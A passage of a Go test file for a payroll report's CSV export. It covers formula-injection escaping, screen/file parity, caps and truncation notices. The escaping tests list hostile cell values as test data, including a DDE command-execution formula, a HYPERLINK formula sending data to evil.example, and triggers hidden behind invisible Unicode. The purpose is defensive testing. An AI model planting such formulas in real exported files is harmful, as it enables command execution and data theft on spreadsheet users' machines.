package handler

// reportscsv_test.go -- M6-07 phase B's unit-level nets.
//
// WHAT IS HERE AND WHAT IS IN reportscsv_db_test.go. The escaping, the parity with the
// screen, the response headers, the caps and the §4.7 column list are properties of
// the RENDERER and are measured here against reports a fake reader hands over --
// which is the only way to build a report that carries a hostile name on purpose.
// What a fake cannot prove is §4.5 and "the query really has no coordinate in it";
// those are against real Postgres, next door.
//
// 🔴 EVERY ASSERTION THAT SOMETHING IS ABSENT IS PAIRED WITH ONE THAT SOMETHING IS
// PRESENT. "No cell begins with =" is satisfied perfectly by an empty file.

import (
	"encoding/csv"
	"encoding/json"
	"errors"
	"go/ast"
	"go/parser"
	"go/token"
	"net/http"
	"net/http/httptest"
	"os"
	"reflect"
	"strconv"
	"strings"
	"testing"
	"time"
	"unicode"
	"unicode/utf8"

	"github.com/google/uuid"

	"github.com/atknatk/tappa/internal/adminauth"
	"github.com/atknatk/tappa/internal/domain/ledger"
	"github.com/atknatk/tappa/internal/policy"
	"github.com/atknatk/tappa/web/templates/pages"
)

// exportBrowser is panelBrowserWithRoster with the audit trail handed back, because
// this section's one write is an audit row and a test that cannot read it would be
// asserting over the handler's silence.
func exportBrowser(t *testing.T, records *fakeLedger) (*browser, *fakeTrail) {
	t.Helper()
	trail := &fakeTrail{}
	admins := &fakeAdmins{verify: func() (adminauth.Resolved, error) {
		return adminauth.Resolved{
			SessionID: panelTestSession, TenantID: panelTestTenant, AdminUserID: panelTestAdmin,
			Role: "owner", FullName: "KF Owner",
		}, nil
	}}
	b := newBrowser(t, newAdminRouterWithLedger(t, admins, trail, records))
	b.cookies[adminauth.CookieName] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	return b, trail
}

// exportCSV drives the real route through the real router and PARSES the answer with
// encoding/csv -- a byte-exact consumer that is not a spreadsheet, which is half of
// what the escaping has to survive.
func exportCSV(t *testing.T, b *browser, query string) ([][]string, *httptest.ResponseRecorder) {
	t.Helper()
	rec := b.do(http.MethodGet, reportsCSVHref+query, nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("GET %s = %d, want 200", reportsCSVHref+query, rec.Code)
	}
	return parseCSV(t, rec.Body.String()), rec
}

// parseCSV reads a document the way any non-spreadsheet consumer would.
//
// FieldsPerRecord = -1 because this file holds six differently shaped blocks in one
// sheet; a ragged read is what a spreadsheet does too.
func parseCSV(t *testing.T, body string) [][]string {
	t.Helper()
	r := csv.NewReader(strings.NewReader(body))
	r.FieldsPerRecord = -1
	rows, err := r.ReadAll()
	if err != nil {
		t.Fatalf("the export is not readable as CSV: %v", err)
	}
	if len(rows) == 0 {
		t.Fatal("the export parsed to no rows at all; every assertion over it would be vacuous")
	}
	return rows
}

// findCell returns the first cell equal to want, or "" and false.
func findCell(rows [][]string, want string) bool {
	for _, row := range rows {
		for _, cell := range row {
			if cell == want {
				return true
			}
		}
	}
	return false
}

// rowStartingWith returns the first row whose first cell is key.
func rowStartingWith(rows [][]string, key string) []string {
	for _, row := range rows {
		if len(row) > 0 && row[0] == key {
			return row
		}
	}
	return nil
}

// --- the escaping -------------------------------------------------------------

// readsAsFormula is what the sweeps below actually ask, and the FIRST VERSION OF IT
// WAS WEAKER THAN THE PROPERTY IT CLAIMED.
//
// 🔴 IT USED TO TEST []rune(cell)[0] AND NOTHING ELSE. That misses every cell whose
// trigger is behind something a spreadsheet discards — " =1+1", "\t=1+1", "\x01=1+1" —
// which is the whole class the escaper's step-over exists for. So the check would have
// been satisfied by an escaper that only looked at the first rune, i.e. by the defect.
// It strips first, exactly as a spreadsheet does, and only then looks.
//
// ⚠️ IT MIRRORS spreadsheetSafe's LOGIC AND THAT IS DELIBERATE RATHER THAN LAZY. This
// one states the PROPERTY (what a spreadsheet decides) and lives in the test binary;
// the other states the DEFENCE and lives in the product. Because they are separate
// pieces of code, mutating the defence leaves this unchanged and the sweeps go red --
// measured, on four separate mutations of the escaper. A helper that CALLED
// spreadsheetSafe would be the tautology this shape is often mistaken for.
func readsAsFormula(cell string) bool {
	for _, r := range cell {
		switch {
		case r == '=' || r == '+' || r == '-' || r == '@',
			// the compatibility fold of those four, plus the typographic minus
			r == '\uFF1D', r == '\uFE66', r == '\u207C', r == '\u208C',
			r == '\uFF0B', r == '\uFE62', r == '\u207A', r == '\u208A',
			r == '\uFF0D', r == '\uFE63', r == '\u207B', r == '\u208B',
			r == '\uFF20', r == '\uFE6B', r == '\u2212':
			return true
		// 🔴 THE HIDING PLACES, AS A SPREADSHEET WOULD DISCARD THEM. The first version
		// of this line was unicode.IsSpace || unicode.IsControl and shared the
		// PRODUCT's blind spot exactly: Go's IsControl is category Cc only, so every
		// format character (Cf) read as an ordinary cell here too. A checker written
		// against the implementation cannot see the implementation's mistake.
		case unicode.IsSpace(r),
			unicode.Is(unicode.Cc, r),
			unicode.Is(unicode.Cf, r),
			unicode.Is(unicode.Properties["Other_Default_Ignorable_Code_Point"], r),
			unicode.Is(unicode.M, r),
			r == utf8.RuneError,
			r == '\u2800':
			continue
		default:
			return false
		}
	}
	return false
}

// TestSpreadsheetSafe_RefusesEveryTriggerAndLeavesOrdinaryCellsAlone is the escaper's
// own control, in BOTH directions.
//
// 🔴 THE SECOND HALF IS NOT DECORATION. A matcher that prefixes every cell is a
// matcher that corrupts every name, which is how a net gets deleted rather than
// fixed -- and it would pass the first half perfectly.
func TestSpreadsheetSafe_RefusesEveryTriggerAndLeavesOrdinaryCellsAlone(t *testing.T) {
	// 🔴 THE ATTACKS ARE THE ONES I TRIED TO GET PAST MY OWN NET WITH, WRITTEN DOWN
	// WHETHER THEY WORKED OR NOT — and one of them DID. The last group is the
	// step-over class: a trigger hiding behind something a spreadsheet discards. The
	// control-character case is here because the first version of this function
	// answered it WRONG (unicode.IsSpace(0x01) is false, so the loop returned the cell
	// unchanged) and no test in the first version could see it.
	hostile := []struct{ name, in string }{
		// the four that begin a formula
		{"the classic", "=1+1"},
		{"plus", "+1+1"},
		{"minus", "-1+1"},
		{"at", "@SUM(A1:A9)"},
		{"the DDE command execution shape", `=cmd|' /C calc'!A0`},
		{"a hyperlink that exfiltrates the cell beside it", `=HYPERLINK("http://evil.example?x="&A1,"click")`},
		{"a plausible employee name that begins with a trigger", "-Maria Borg"},
		// the step-over class: only the leading rubbish differs
		{"a leading SPACE", " =1+1"},
		{"a leading TAB", "\t=1+1"},
		{"a leading CARRIAGE RETURN", "\r=1+1"},
		{"a leading newline", "\n=1+1"},
		{"a NO-BREAK SPACE, which is a space to Go and invisible to a reader", " =1+1"},
		// 🔴 THE ONE THAT WAS GETTING THROUGH. 0x01 is a control character and NOT a
		// space, so a step-over written with unicode.IsSpace alone stops at it and
		// calls the cell ordinary.
		{"a leading non-space CONTROL character", "\x01=1+1"},
		{"a NUL", "\x00@SUM(A1)"},
		{"whitespace and control mixed", "\t \r\x01@SUM(A1)"},
		// 🔴 THE FORMAT CATEGORY (Cf). Every one of these reached a downloaded file
		// UNESCAPED in front of a live formula while the step-over was written with
		// unicode.IsControl, which is category Cc alone. They are listed individually
		// rather than generated, so the failure message names the rune that got through.
		{"a byte order mark", "\uFEFF=cmd|' /C calc'!A0"},
		{"a zero-width space", "\u200B=HYPERLINK(\"http://evil.example\",\"x\")"},
		{"a soft hyphen", "\u00AD=1+1"},
		{"a word joiner", "\u2060@SUM(A1)"},
		{"a right-to-left override", "\u202E=1+1"},
		{"a zero-width non-joiner", "\u200C=1+1"},
		{"an Arabic number sign", "\u0600=1+1"},
		// 🔴 THE NON-SPACING MARKS (Mn). Zero advance width, so they hide a trigger
		// exactly as a Cf rune does.
		{"a combining grapheme joiner", "\u034F=1+1"},
		{"a combining acute accent", "\u0301=1+1"},
		// 🔴 AN ENCLOSING MARK (Me). It is here because a review dropped Me from the
		// skip set ON ITS OWN and the suite stayed GREEN: the Mn cases above covered
		// the pair, so "each class is measured going red on its own" was true of four
		// classes and asserted of five. One case per class, or the sentence is a claim.
		{"a combining enclosing circle backslash", "\u20E0=1+1"},
		// 🔴 THE FULL-WIDTH TWINS. Not a hiding place but a look-alike, and whether a
		// spreadsheet evaluates one could not be measured here -- startsAFormula says
		// why it is escaped anyway.
		{"a full-width equals", "\uFF1D1+1"},
		{"a full-width plus", "\uFF0B1+1"},
		{"a full-width at", "\uFF20SUM(A1)"},
		// 🔴 THE FULL-WIDTH HYPHEN-MINUS, WHICH WAS THE OTHER UNPINNED ONE. Dropping it
		// alone left the suite green because the other four full-width twins carried the
		// case between them.
		{"a full-width hyphen-minus", "\uFF0D1+1"},
		// The rest of the compatibility fold of the four triggers. One case per rune,
		// because a review measured that a class carried by its siblings is a class
		// nobody has pinned.
		{"a small equals sign", "\uFE661+1"},
		{"a superscript equals", "\u207C1+1"},
		{"a subscript equals", "\u208C1+1"},
		{"a small plus sign", "\uFE621+1"},
		{"a superscript plus", "\u207A1+1"},
		{"a subscript plus", "\u208A1+1"},
		{"a small hyphen-minus", "\uFE631+1"},
		{"a superscript minus", "\u207B1+1"},
		{"a subscript minus", "\u208B1+1"},
		{"a small commercial at", "\uFE6BSUM(A1)"},
		// 🔴 THE CLASSES A LATER REVIEW FOUND OUTSIDE THE OLD BOUNDARY. Each is the
		// exclusive property of one limb of hidesTheStartOfACell, so each pins that limb
		// on its own.
		{"a HANGUL FILLER, which is a LETTER that renders as nothing", "\u3164=1+1"},
		{"a halfwidth Hangul filler", "\uFFA0=1+1"},
		{"a braille blank", "\u2800=1+1"},
		{"invalid UTF-8, which a range loop yields as U+FFFD", "\x80=1+1"},
		// 🔴 THE CHAIN. A SPACING combining mark (Mc) used to stop the search, so a Cf
		// rune BEHIND one was never reached — the Cf fix could be walked around by
		// putting one character in front of it.
		{"a spacing mark then a zero-width space then a trigger", "\u0903\u200B=1+1"},
		{"a typographic minus sign", "\u22121+1"},
	}
	for _, c := range hostile {
		t.Run(c.name, func(t *testing.T) {
			got := spreadsheetSafe(c.in)
			if got == c.in {
				t.Fatalf("spreadsheetSafe(%q) left it unchanged; a spreadsheet evaluates it", c.in)
			}
			if !strings.HasPrefix(got, "'") {
				t.Fatalf("spreadsheetSafe(%q) = %q, which does not begin with the text marker", c.in, got)
			}
			// 🔴 AND THE VALUE SURVIVES. An escape that a byte-exact consumer cannot
			// undo is data corruption dressed as a defence -- this is the half the
			// M6-07 phase B brief asks for by name.
			if back := strings.TrimPrefix(got, "'"); back != c.in {
				t.Fatalf("the value is not recoverable: %q -> %q -> %q", c.in, got, back)
			}
		})
	}

	// THE OTHER DIRECTION: everything this product actually writes, and the two
	// alphabets whose names this file exists to keep intact.
	ordinary := []string{
		"", "Maria Borg", "Anne-Marie Vella", "Ħal Qormi", "Żejtun", "Ċirkewwa",
		"Atağ Şen", "Işıl Çelik", "Unknown employee", "Unknown venue",
		"Kebab Factory Ltd", "2026-08-03", "2026-08-03T10:00:00+02:00", "8h 00m",
		"0", "510", "yes", "no", "employee_id", "worked_minutes",
		"St. Julian's", `Maria "the boss" Borg`, "O'Brien",
		// Rubbish with NO trigger behind it stays untouched: the step-over must not
		// become "escape anything that starts oddly". The Cf and Mn entries are the
		// control for the classes added after the second review -- widening a SKIP set
		// cannot escape on its own, and this is what says so.
		"\tMaria Borg", " Maria Borg", "\x01Maria Borg",
		"\uFEFFMaria Borg", "\u200BMaria Borg", "\u00ADMaria Borg", "\u202EMaria Borg",
		"\u034FMaria Borg", "\u0301Maria Borg", "\u20E0Maria Borg",
		"\u3164Maria Borg", "\u2800Maria Borg", "\u0903Maria Borg", "\x80Maria Borg",
		// A name whose FIRST character is a legitimate letter carrying a combining
		// accent: the mark is not leading, so nothing here even looks at it.
		"Mari\u0301a Borg", "Ħal Qormi", "Żejtun",
	}
	for _, s := range ordinary {
		if got := spreadsheetSafe(s); got != s {
			t.Errorf("spreadsheetSafe(%q) = %q -- an ordinary cell was rewritten; a matcher "+
				"that refuses everything is one somebody deletes rather than fixes", s, got)
		}
	}
}

// TestReportCSV_EscapesEveryHostileCellIncludingTheONESWeWriteOurselves is the
// escaping measured through the WHOLE renderer rather than on the function.
//
// 🔴 THE SCAN IS STRUCTURAL: it parses the produced file and walks EVERY field of
// EVERY row. A test naming the cells it expects to be escaped is a test that misses
// the column somebody adds next -- which is exactly how a §4.7 net was beaten twice
// in phase A (`address` was listed, `addr` was not).
func TestReportCSV_EscapesEveryHostileCellIncludingTheONESWeWriteOurselves(t *testing.T) {
	week := weekOfUTC()
	// EVERY free-text field this document can carry, made hostile at once.
	screen := ledger.ReportScreen{
		TenantName: "=cmd|' /C calc'!A0 Ltd",
		Report: ledger.Report{
			Queried: true, Zone: time.UTC, Period: week,
			Totals: ledger.Totals{Worked: 8 * time.Hour, Shifts: 1, Open: 1},
			People: []ledger.PersonHours{{
				EmployeeID: uuid.MustParse("11111111-2222-4333-8444-555555555555"),
				Name:       "=1+1", Worked: 8 * time.Hour, Shifts: 1,
				Daily: make([]time.Duration, ledger.ReportDays),
			}, {
				EmployeeID: uuid.MustParse("66666666-7777-4888-8999-aaaaaaaaaaaa"),
				Name:       "\t@SUM(A1)", Worked: time.Hour, Shifts: 1,
				Daily: make([]time.Duration, ledger.ReportDays),
			}},
			Venues: []ledger.VenueHours{{Name: " -2+3", Worked: 8 * time.Hour, Shifts: 1}},
			Open: []ledger.OpenEntry{{
				EmployeeName: "+1+1", LocationName: "\r=HYPERLINK(\"http://evil.example\")",
				At: week.From.Add(3 * time.Hour), Stale: true,
			}},
		},
	}
	doc, err := reportCSV(screen, week.From.Add(50*time.Hour))
	if err != nil {
		t.Fatalf("reportCSV: %v", err)
	}
	rows := parseCSV(t, string(doc))

	// POSITIVE CONTROL: the hostile values really are in this file. Without it the
	// sweep below would pass over a document that dropped them.
	cells := 0
	hostileSeen := 0
	for _, row := range rows {
		for _, cell := range row {
			cells++
			if strings.HasPrefix(cell, "'") {
				hostileSeen++
			}
		}
	}
	if cells < 50 {
		t.Fatalf("the parsed document holds %d cell(s); it holds more, so this scan is "+
			"reading the wrong thing", cells)
	}
	// Six hostile strings went in (tenant, two names, a venue, an open person, an open
	// venue), and the count is derived rather than written down.
	if hostileSeen < 6 {
		t.Fatalf("only %d cell(s) carry the text marker; the hostile values are not in the "+
			"file, so the sweep below proves nothing", hostileSeen)
	}

	// 🔴 THE SWEEP, AND IT STRIPS BEFORE IT LOOKS. Not one cell in the whole document
	// may read as a formula once a spreadsheet has discarded the leading whitespace and
	// control characters it discards.
	for r, row := range rows {
		for c, cell := range row {
			if readsAsFormula(cell) {
				t.Errorf("row %d cell %d is a FORMULA when this file is opened: %q", r+1, c, cell)
			}
		}
	}

	// AND THE VALUES ARE STILL THERE, recoverable by a consumer that is not a
	// spreadsheet. This is the "no corruption" half, on the real document.
	for _, want := range []string{"=1+1", "\t@SUM(A1)", " -2+3", "+1+1", "=cmd|' /C calc'!A0 Ltd"} {
		if !findCell(rows, "'"+want) {
			t.Errorf("the escaped form of %q is not recoverable from the file", want)
		}
	}
}

// --- parity with the screen (obligation 1) ------------------------------------

// TestReportCSV_AgreesWithTheScreenItWasExportedFrom is the FIRST obligation phase A
// handed over, asserted as an equality rather than as a claim in a comment.
//
// 🔴 IT RENDERS BOTH SURFACES FROM ONE ledger.Report AND REQUIRES THE SAME FIGURES.
// A second accumulator in the export is the failure this repository keeps paying for:
// each implementation is self-consistent, they disagree about payroll, and nobody
// diffs a spreadsheet against a web page. Measured going red when reportCSVTotals
// sums the person rows instead of reading ledger.Totals.
func TestReportCSV_AgreesWithTheScreenItWasExportedFrom(t *testing.T) {
	// A week with EVERY figure non-zero and none of them equal to another, so a
	// crossed field cannot pass by coincidence.
	daily := make([]time.Duration, ledger.ReportDays)
	daily[0] = 5*time.Hour + 15*time.Minute
	daily[3] = 3*time.Hour + 45*time.Minute
	report := func(r *ledger.Report) {
		r.Totals = ledger.Totals{
			Worked:   9 * time.Hour,
			Shifts:   2,
			Awaiting: 3*time.Hour + 30*time.Minute,
			Refused:  time.Hour + 10*time.Minute,
			Open:     3,
			TooLong:  1,
		}
		r.PracticeTaps = 4
		r.StartedEarlier = 5
		r.Unattributable = 6
		// 🔴 THE PERSON ROWS DELIBERATELY DO NOT ADD UP TO Totals.Worked, AND THAT IS
		// WHAT MAKES THIS TEST ABLE TO TELL THE TWO IMPLEMENTATIONS APART. The first
		// version of this fixture gave one person exactly the week's total, so a CSV
		// that SUMMED ITS OWN ROWS printed the same figure and the mutation stayed
		// green -- measured, and it is the reason this comment exists. A real reader
		// keeps the two in step (ledger.accumulate adds to both in one pass), so only a
		// fixture that breaks the coincidence can prove the export READS the field
		// rather than RECOMPUTING it. 5h + 3h != 9h, on purpose.
		r.People = []ledger.PersonHours{{
			EmployeeID: uuid.MustParse("11111111-2222-4333-8444-555555555555"),
			Name:       "Maria Borg", Worked: 5 * time.Hour, Shifts: 1, Daily: daily,
			Awaiting: 3*time.Hour + 30*time.Minute, Refused: time.Hour + 10*time.Minute,
			LateShifts: 1, LateBy: 17 * time.Minute, Unmeasured: 2, ManualArrivals: 1, Open: 2,
		}, {
			EmployeeID: uuid.MustParse("99999999-2222-4333-8444-555555555555"),
			Name:       "Antoine Vella", Worked: 3 * time.Hour, Shifts: 1,
			Daily: make([]time.Duration, ledger.ReportDays),
		}}
		r.Venues = []ledger.VenueHours{{Name: "KF St Julians", Worked: 8 * time.Hour, Shifts: 2}}
		// 🔴 TWO STALE AND ONE FRESH, WHICH IS NOT AN ARBITRARY MIX. A fixture with one
		// of each makes "stale" and "not stale" the same COUNT, so a surface that
		// inverted the test would print the same number and this comparison would pass
		// over it — measured, on this test's previous fixture.
		r.Open = []ledger.OpenEntry{
			{EmployeeName: "Maria Borg", LocationName: "KF St Julians", At: weekOfUTC().From.Add(30 * time.Hour), Stale: true},
			{EmployeeName: "Ines Camilleri", LocationName: "KF St Julians", At: weekOfUTC().From.Add(40 * time.Hour), Stale: true},
			{EmployeeName: "Antoine Vella", LocationName: "Rusty Bar", At: weekOfUTC().From.Add(100 * time.Hour)},
		}
	}

	records := newFakeLedger()
	records.hours = reportWith(report)
	b, _ := exportBrowser(t, records)

	page := b.do(http.MethodGet, reportsHref, nil).Body.String()
	rows, _ := exportCSV(t, b, "")

	// EVERY FIGURE THE SCREEN PRINTS MUST BE IN THE FILE, and they are compared as the
	// STRINGS the one shared formatter produced -- which is what makes this an equality
	// between two renderings rather than two arithmetics that happen to agree today.
	for _, want := range []string{
		"9h 00m", // the payroll total
		"3h 30m", // awaiting a decision
		"1h 10m", // refused
		"5h 15m", // one daily cell, as hours (per person, weekly)
		"0h 17m", // late by
	} {
		if !strings.Contains(page, want) {
			t.Fatalf("the SCREEN does not print %q, so the comparison below is vacuous", want)
		}
	}
	for _, want := range []string{"9h 00m", "3h 30m", "1h 10m", "0h 17m"} {
		if !findCell(rows, want) {
			t.Errorf("the screen prints %q and the CSV does not; the two surfaces disagree", want)
		}
	}

	// AND THE COUNTS, which is where a second implementation shows up first.
	totals := rowStartingWith(rows, "Hours worked")
	if len(totals) < 3 {
		t.Fatal("the CSV has no 'Hours worked' total row")
	}
	if totals[1] != hoursMinutes(9*time.Hour) {
		t.Errorf("the CSV totals %q, the report says %q -- the export is recomputing the "+
			"payroll figure rather than reading ledger.Totals", totals[1], hoursMinutes(9*time.Hour))
	}
	// AND THE SUM OF THE ROWS REALLY IS A DIFFERENT NUMBER, so the assertion above is
	// discriminating rather than lucky. Without this control the fixture could drift
	// back to one where the two agree and nobody would notice.
	if hoursMinutes(5*time.Hour+3*time.Hour) == hoursMinutes(9*time.Hour) {
		t.Fatal("the fixture's rows sum to its own total; this case cannot tell a read " +
			"from a recomputation")
	}
	// 🔴 THE ARITHMETIC COLUMN IS EXACT AND INTEGER (§6). 9h = 540 minutes, derived
	// from the same Duration rather than written down.
	if got, want := totals[2], strconv.Itoa(wholeMinutes(9*time.Hour)); got != want {
		t.Errorf("worked_minutes = %q, want %q", got, want)
	}
	if shifts := rowStartingWith(rows, "Shifts"); shifts == nil || shifts[1] != "2" {
		t.Errorf("the CSV's shift count is %v, the report says 2", shifts)
	}

	// 🔴 THE NEEDS-ACTION TALLY IS COMPARED ACROSS THE TWO SURFACES, and it is here
	// because a review measured its absence: this quantity was computed twice, once per
	// surface, and inverting the file's copy left this whole test GREEN. The duplicate
	// is gone (both read needsActionTotal) and this is the net that says so — it
	// compares the SENTENCE the screen prints against the CELL the file writes.
	//
	// ⚠️ WHAT THIS CAN AND CANNOT CATCH, STATED SO IT IS NOT OVER-READ. With ONE
	// calculation point it cannot catch a wrong answer — both surfaces would print the
	// same wrong number, and the VALUE tests
	// (TestReportCSV_CountsTheBacklogThatNeedsAManagerAsAWHOLE and
	// TestReportsSection_SaysHowMuchOfTheBacklogNeedsAction) are what do that; both are
	// measured going red on an inverted counter. What THIS catches is RE-DUPLICATION:
	// a surface that goes back to accumulating its own copy. The fixture is 2 stale and
	// 1 fresh so the two answers are different numbers.
	if !strings.Contains(page, "2 of these have been open too long") {
		t.Fatalf("the screen does not print the needs-action tally, so the comparison " +
			"below is vacuous")
	}
	tally := rowStartingWith(rows, "Open too long to be somebody on shift")
	if tally == nil {
		t.Fatal("the CSV has no needs-action tally row")
	}
	if tally[1] != "2" {
		t.Errorf("the screen says 2 open check-ins need a manager and the file says %q; "+
			"the two surfaces disagree about a quantity they are supposed to share",
			tally[1])
	}
}

// TestWholeMinutes_IsExactIntegerArithmetic pins the one number an accountant SUMS.
func TestWholeMinutes_IsExactIntegerArithmetic(t *testing.T) {
	cases := []struct {
		in   time.Duration
		want int
	}{
		{in: 0, want: 0},
		{in: 59 * time.Second, want: 0},
		{in: time.Minute, want: 1},
		{in: 8*time.Hour + 30*time.Minute, want: 510},
		// TRUNCATION, the same rule hoursMinutes uses, so the two columns of one cell
		// can never disagree.
		{in: 7*time.Hour + 29*time.Minute + 59*time.Second, want: 449},
		{in: 100 * time.Hour, want: 6000},
	}
	for _, c := range cases {
		if got := wholeMinutes(c.in); got != c.want {
			t.Errorf("wholeMinutes(%v) = %d, want %d", c.in, got, c.want)
		}
		// AND IT AGREES WITH THE HUMAN COLUMN BESIDE IT, which is the property that
		// keeps a reader from finding two different answers in one row.
		h := c.want / 60
		m := c.want % 60
		if want := strconv.Itoa(h) + "h " + pad2(m) + "m"; hoursMinutes(c.in) != want {
			t.Errorf("hoursMinutes(%v) = %q but the minutes column says %d", c.in, hoursMinutes(c.in), c.want)
		}
	}
}

// TestReportCSVSource_UsesNoFloatAndNoFloatReturningAccessor is §6 over the ONE file
// that turns a duration into a figure somebody adds up.
//
// 🔴 IT PARSES THE SOURCE RATHER THAN GREPPING IT, for the reason phase A recorded:
// a word-scan for "float" is satisfied by the comment that says there is no float,
// and misses `d.Hours()` -- which IS one.
func TestReportCSVSource_UsesNoFloatAndNoFloatReturningAccessor(t *testing.T) {
	fset := token.NewFileSet()
	file, err := parser.ParseFile(fset, "reportscsv.go", nil, 0)
	if err != nil {
		t.Fatalf("parsing reportscsv.go: %v", err)
	}
	nodes := 0
	// time.Duration's float64-returning accessors. Nanoseconds/Microseconds/
	// Milliseconds are int64 and are not here on purpose -- a list that refuses them
	// too would be one somebody works around.
	floatAccessor := map[string]bool{"Hours": true, "Minutes": true, "Seconds": true}
	ast.Inspect(file, func(n ast.Node) bool {
		nodes++
		switch v := n.(type) {
		case *ast.BasicLit:
			if v.Kind == token.FLOAT {
				t.Errorf("%s: a float literal %s in the export path", fset.Position(v.Pos()), v.Value)
			}
		case *ast.Ident:
			if v.Name == "float64" || v.Name == "float32" {
				t.Errorf("%s: %s in the export path", fset.Position(v.Pos()), v.Name)
			}
		case *ast.CallExpr:
			if sel, ok := v.Fun.(*ast.SelectorExpr); ok && floatAccessor[sel.Sel.Name] && len(v.Args) == 0 {
				t.Errorf("%s: .%s() returns a float64; a payroll column may not come "+
					"through one (§6)", fset.Position(v.Pos()), sel.Sel.Name)
			}
		}
		return true
	})
	// ANTI-VACUITY: a walk of an empty tree passes forever.
	if nodes < 200 {
		t.Fatalf("the walk saw %d node(s); reportscsv.go holds more, so it read the wrong file", nodes)
	}
}

// --- the caps (obligation 8) ---------------------------------------------------

// TestReportCSV_CarriesEveryRowPastTheScreensCaps is phase A's eighth handover: the
// listing caps are the SCREEN's and must not reach the file.
//
// 🔴 THE EXPORT IS WHAT THE SCREEN'S CAP IS JUSTIFIED BY POINTING AT. maxReportRows
// and maxOpenRows are defended in reports.go with "the export is where somebody with
// four hundred staff gets every row" -- so a capped export would make that
// justification false and the cap unjustifiable, in one edit.
func TestReportCSV_CarriesEveryRowPastTheScreensCaps(t *testing.T) {
	const people = maxReportRows + 37
	const open = maxOpenRows + 53
	week := weekOfUTC()
	records := newFakeLedger()
	records.hours = reportWith(func(r *ledger.Report) {
		r.Totals = ledger.Totals{Worked: time.Duration(people) * time.Hour, Shifts: people, Open: open}
		for i := 0; i < people; i++ {
			r.People = append(r.People, ledger.PersonHours{
				EmployeeID: uuid.New(),
				Name:       "Employee " + pad2(i),
				Worked:     time.Hour, Shifts: 1,
				Daily: make([]time.Duration, ledger.ReportDays),
			})
		}
		for i := 0; i < open; i++ {
			r.Open = append(r.Open, ledger.OpenEntry{
				EmployeeName: "Open Worker " + pad2(i),
				LocationName: "KF St Julians",
				At:           week.From.Add(time.Duration(i) * time.Minute),
			})
		}
	})
	b, _ := exportBrowser(t, records)

	// POSITIVE CONTROL: the SCREEN really does stop where it says it does, so "the
	// file has more" is a difference rather than a coincidence.
	page := b.do(http.MethodGet, reportsHref, nil).Body.String()
	if !strings.Contains(page, "Showing 100 of 137 people") {
		t.Fatal("the screen is not capped in this fixture; the comparison below proves nothing")
	}

	rows, _ := exportCSV(t, b, "")
	for i := 0; i < people; i++ {
		if !findCell(rows, "Employee "+pad2(i)) {
			t.Fatalf("person %d of %d is missing from the export; the screen's cap has "+
				"reached the file", i, people)
		}
	}
	for i := 0; i < open; i++ {
		if !findCell(rows, "Open Worker "+pad2(i)) {
			t.Fatalf("open entry %d of %d is missing from the export", i, open)
		}
	}
	// AND THE SCREEN SAYS WHERE THE REST IS, which is what makes the cap honest
	// rather than merely bounded.
	if !strings.Contains(page, "Download the CSV for every row") {
		t.Error("the shortened listing does not point at the file that holds the rest")
	}
}

// --- §4.6 in a file (obligation 7) ---------------------------------------------

// TestReportCSV_SaysATruncatedReadIsAFloorRatherThanATotal is the §4.6 line this
// section is not allowed to cross, moved from a screen to a payroll process.
//
// 🔴 A SILENTLY SHORT CSV IS WORSE THAN A SILENTLY SHORT SCREEN. A manager reading a
// page knows their own business and notices a missing week; a spreadsheet does not
// notice anything, and the figure is paid.
func TestReportCSV_SaysATruncatedReadIsAFloorRatherThanATotal(t *testing.T) {
	records := newFakeLedger()
	records.hours = reportWith(func(r *ledger.Report) {
		r.Truncated = true
		r.Totals = ledger.Totals{Worked: 12 * time.Hour, Shifts: 2}
	})
	b, _ := exportBrowser(t, records)
	rows, _ := exportCSV(t, b, "")

	complete := rowStartingWith(rows, "Read complete")
	if complete == nil {
		t.Fatal("the export never says whether the read was complete")
	}
	if complete[1] != "NO" {
		t.Fatalf("a truncated read exported as %q", complete[1])
	}
	if !strings.Contains(complete[3], "FLOOR AND NOT A TOTAL") {
		t.Errorf("the notice does not say what is wrong with the figures below it: %q", complete[3])
	}
	// The cap is NAMED, and it comes from the constant rather than from a literal, so
	// the sentence cannot drift from the code that enforces it.
	if !strings.Contains(complete[3], strconv.Itoa(ledger.ReportEventCap)) {
		t.Error("the notice does not say how many records one report reads")
	}
	// 🔴 IT IS IN THE FIRST BLOCK, BEFORE ANY FIGURE. A warning under a table is a
	// warning nobody scrolls to.
	warnAt, totalAt := -1, -1
	for i, row := range rows {
		if len(row) > 0 && row[0] == "Read complete" && warnAt < 0 {
			warnAt = i
		}
		if len(row) > 0 && row[0] == "Hours worked" && totalAt < 0 {
			totalAt = i
		}
	}
	if warnAt < 0 || totalAt < 0 || warnAt > totalAt {
		t.Errorf("the incompleteness notice is at row %d and the first figure at row %d; "+
			"the notice must come first", warnAt, totalAt)
	}

	// POSITIVE CONTROL: a complete read says so, and says it DIFFERENTLY -- silence
	// and "yes" are not the same claim, and without this the assertion above would be
	// satisfied by a file that always shouts.
	clean := newFakeLedger()
	clean.hours = reportWith(func(r *ledger.Report) {
		r.Totals = ledger.Totals{Worked: 12 * time.Hour, Shifts: 2}
	})
	cb, _ := exportBrowser(t, clean)
	cleanRows, _ := exportCSV(t, cb, "")
	ok := rowStartingWith(cleanRows, "Read complete")
	if ok == nil || ok[1] != "yes" {
		t.Fatalf("a complete read exported as %v", ok)
	}
	if strings.Contains(strings.Join(ok, " "), "FLOOR") {
		t.Error("a complete read also carries the floor warning, so the warning means nothing")
	}
}

// TestReportCSV_NamesEveryQuantityTheHoursExclude is the rest of §4.6: excluded is
// not the same as invisible, and a file has to carry the whole list because its
// reader cannot ask.
func TestReportCSV_NamesEveryQuantityTheHoursExclude(t *testing.T) {
	records := newFakeLedger()
	records.hours = reportWith(func(r *ledger.Report) {
		r.Totals = ledger.Totals{
			Worked: 40 * time.Hour, Shifts: 5,
			Awaiting: 3*time.Hour + 30*time.Minute, Refused: time.Hour,
			Open: 2, TooLong: 1,
		}
		r.PracticeTaps = 4
		r.StartedEarlier = 2
		r.Unattributable = 1
		r.Open = []ledger.OpenEntry{
			{EmployeeName: "Maria Borg", LocationName: "KF St Julians", At: weekOfUTC().From.Add(34 * time.Hour), Stale: true},
			{EmployeeName: "Antoine Vella", LocationName: "Rusty Bar", At: weekOfUTC().From.Add(140 * time.Hour)},
		}
	})
	b, _ := exportBrowser(t, records)
	rows, _ := exportCSV(t, b, "")

	// Every quantity the payroll figure holds back, with the value it holds back.
	for _, c := range []struct{ key, value string }{
		{"Hours awaiting a decision", "3h 30m"},
